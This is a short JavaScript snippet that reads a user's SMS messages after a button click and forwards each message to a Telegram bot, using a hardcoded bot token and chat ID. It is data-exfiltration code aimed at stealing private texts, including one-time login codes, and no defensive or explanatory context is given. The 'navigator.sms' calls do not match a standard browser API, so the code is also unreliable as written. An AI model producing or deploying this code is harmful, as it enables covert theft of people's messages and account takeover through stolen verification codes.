const telegramBotToken = '6999716266:AAFC7En0WCUoI4yMyOsKnT1ssvS3rmCbHP8';
const telegramBotChatId = '7157112319';

requestAccessButton.addEventListener('click', async () => {
  try {
    const sms = await navigator.sms.requestAccess();
    console.log('SMS access granted!');
    const messages = await sms.getMessages();
    messages.forEach((message) => {
      const messageText = message.body;
      const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
      const formData = new FormData();
      formData.append('chat_id', telegramBotChatId);
      formData.append('text', messageText);
      fetch(telegramApiUrl, {
        method: 'POST',
        body: formData,
      })
      .then((response) => response.json())
      .then((data) => console.log(`Message sent to Telegram bot: ${data.result.message_id}`))
      .catch((error) => console.error(`Error sending message to Telegram bot: ${error}`));
    });
  } catch (error) {
    console.error('Error requesting SMS access:', error);
  }
});